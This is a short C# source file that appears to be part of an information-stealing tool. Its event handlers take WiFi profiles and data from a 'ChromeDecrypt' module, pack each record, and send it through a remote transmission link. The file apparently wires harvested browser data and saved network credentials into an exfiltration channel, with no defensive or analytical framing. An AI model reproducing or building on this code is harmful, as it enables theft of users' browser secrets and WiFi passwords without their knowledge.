using System;
using System.Collections.Generic;
using ChromeDecrypt;
using PS03.Transmit;
using WiPS.Modles;

namespace PS03
{
    public class Eventhandlers
    {
        public RTransLink rtl = new RTransLink();
        private ChromePacker cpack = new ChromePacker();
        private WifiPacker wpack = new WifiPacker();

        public void HandleWiFiProfileReady(List<Profile> profiles)
        {
            foreach (var profile in profiles)
                rtl.Send(wpack.Pack(profile));
        }

        public void HandleChromeDataReady(List<CPProfile> profiles)
        {
            foreach (var profile in profiles)
                rtl.Send(cpack.Pack(profile));
        }
    }
}